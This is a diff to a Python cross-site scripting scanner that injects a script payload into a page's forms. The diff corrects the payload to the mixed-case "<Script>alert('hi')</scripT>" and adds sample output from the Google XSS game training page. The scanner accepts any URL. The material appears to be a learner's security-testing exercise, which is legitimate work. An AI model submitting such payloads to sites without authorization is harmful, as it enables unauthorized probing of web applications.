@@ -73,9 +73,8 @@ def scan_xss(url):
     ##Determines how many items there are in the list and prints the number of forms on the page.
     print(f"[+] Detected {len(forms)} forms on {url}.")
     ##html/JavaScript to inject
-    ##I tried about 20 different things here and was never able to get the desired result. I'm just not sure at this point where the problem lies.
-    ##I keep getting a Status 404 and I know this URL works.
-    js_script = "<script>alert('hello')<.script>"
+    ##I keep getting a Status 404 from multiple URLs. The specific testing target works: https://xss-game.appspot.com/level1/frame
+    js_script = "<Script>alert('hi')</scripT>"
     ##Set the default to vulnerability being false
     is_vulnerable = False
     ##Loop through each occurence of a form tag and 
@@ -99,3 +98,17 @@ def scan_xss(url):
 if __name__ == "__main__":
     url = input("Enter a URL to test for XSS:")
     print(scan_xss(url))
+
+'''
+Output of a successful xss compromised scan
+[+] Detected 1 forms on https://xss-game.appspot.com/level1/frame.
+[+] XSS Detected on https://xss-game.appspot.com/level1/frame
+[*] Form details:
+{'action': '',
+ 'inputs': [{'name': 'query',
+             'type': 'text',
+             'value': "<Script>alert('hi')</scripT>"},
+            {'name': None, 'type': 'submit'}],
+ 'method': 'get'}
+True
+'''
